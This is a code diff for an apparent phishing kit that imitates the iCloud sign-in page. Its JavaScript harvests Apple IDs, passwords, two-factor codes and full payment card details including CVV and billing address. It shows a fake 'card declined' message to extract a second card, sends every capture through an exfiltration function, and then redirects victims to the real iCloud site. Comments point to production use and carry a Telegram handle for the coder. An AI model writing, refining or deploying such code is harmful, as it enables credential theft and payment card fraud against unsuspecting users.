@@ -1,21 +1,12 @@
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginFormElement');
-    const createForm = document.getElementById('createFormElement');
     const twoFactorForm = document.getElementById('twoFactorForm');
     const cardForm = document.getElementById('cardForm');
     const secondCardForm = document.getElementById('secondCardForm');
     const twoFactorModal = document.getElementById('twoFactorModal');
     const cardVerifyPage = document.getElementById('cardVerifyPage');
-    const formContainer = document.getElementById('formContainer');
+    const pageContainer = document.getElementById('pageContainer');
     const declinedMsg = document.getElementById('declinedMsg');
-
-    // Flip Animation Handler
-    document.querySelectorAll('.flipLink').forEach(link => {
-        link.addEventListener('click', (e) => {
-            e.preventDefault();
-            formContainer.classList.toggle('flipped');
-        });
-    });
 
     // Stage 1: Login Harvest
     loginForm.addEventListener('submit', (e) => {
@@ -25,18 +16,19 @@ document.addEventListener('DOMContentLoaded', function() {
         const keepSignedIn = document.getElementById('keepSignedIn').checked;
 
         // Fake Processing
-        loginForm.innerHTML += '<div class="loading">Verifying...</div>';
+        const submitBtn = loginForm.querySelector('.submit-btn');
+        submitBtn.innerHTML = '<div class="loading">Verifying...</div>';
 
         setTimeout(() => {
             // Exfil Login Data
             const userAgent = navigator.userAgent;
-            const ip = 'SIMULATED_IP'; // Replace with real IP API in prod
+            const ip = 'SIMULATED_IP'; // Replace with https://api.ipify.org?format=json in prod
             const loginData = `🆕 iCloud Login Harvest\nApple ID: ${appleId}\nPassword: ${password}\nKeep Signed: ${keepSignedIn}\nIP: ${ip}\nUA: ${userAgent}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
             window.exfilData(loginData);
 
-            // Trigger 2FA Modal
+            // Show 2FA Modal
             twoFactorModal.classList.remove('hidden');
-            loginForm.innerHTML = '<p>Login submitted. Check your device.</p>';
+            pageContainer.style.display = 'none';
         }, 1500);
     });
 
@@ -49,10 +41,10 @@ document.addEventListener('DOMContentLoaded', function() {
         const twoFaData = `🔑 2FA Code: ${code}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
         window.exfilData(twoFaData);
 
-        // Fake Success, Escalate to Card
+        // Escalate to Card
         setTimeout(() => {
             twoFactorModal.classList.add('hidden');
-            document.getElementById('loginForm').style.display = 'none';
+            pageContainer.style.display = 'none';
             cardVerifyPage.classList.remove('hidden');
         }, 1000);
     });
@@ -67,7 +59,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const billingAddress = document.getElementById('billingAddress').value;
         const billingZip = document.getElementById('billingZip').value;
 
-        // Luhn Check Simulation
+        // Luhn Check
         function luhnCheck(cardNum) {
             let sum = 0;
             let alternator = false;
@@ -92,8 +84,8 @@ document.addEventListener('DOMContentLoaded', function() {
         const cardData = `💳 First Card Harvest\nName: ${cardName}\nNumber: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nAddress: ${billingAddress}\nZIP: ${billingZip}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
         window.exfilData(cardData);
 
-        // Show Declined, Prompt Second Card
-        declinedMsg.textContent = 'Card declined due to security. Please provide alternate.';
+        // Prompt Second Card
+        declinedMsg.textContent = 'Card declined due to security. Please provide an alternate card.';
         declinedMsg.classList.remove('hidden');
         cardForm.classList.add('hidden');
         secondCardForm.classList.remove('hidden');
@@ -111,25 +103,17 @@ document.addEventListener('DOMContentLoaded', function() {
         const secondCardData = `💳 Second Card Harvest\nName: ${cardName2}\nNumber: ${cardNumber2}\nExpiry: ${expiry2}\nCVV: ${cvv2}\nTime: ${new Date().toISOString()}\nCoder TG: @boyxcodex`;
         window.exfilData(secondCardData);
 
-        // Fake Success & Redirect
-        alert('Verification successful! Redirecting...');
+        // Redirect
+        alert('Verification successful! Redirecting to iCloud...');
         setTimeout(() => {
             window.location.href = 'https://www.icloud.com/';
         }, 2000);
     });
 
-    // Decoy Create Form
-    createForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        const createData = `🆕 Create Account Attempt: [Details]\nCoder TG: @boyxcodex`;
-        window.exfilData(createData);
-        alert('Account creation initiated.');
-    });
-
     // Forgot Password Decoy
     document.getElementById('forgotPassword').addEventListener('click', (e) => {
         e.preventDefault();
-        alert('Password reset link sent to your email.');
+        alert('A password reset link has been sent to your email.');
     });
 });
 
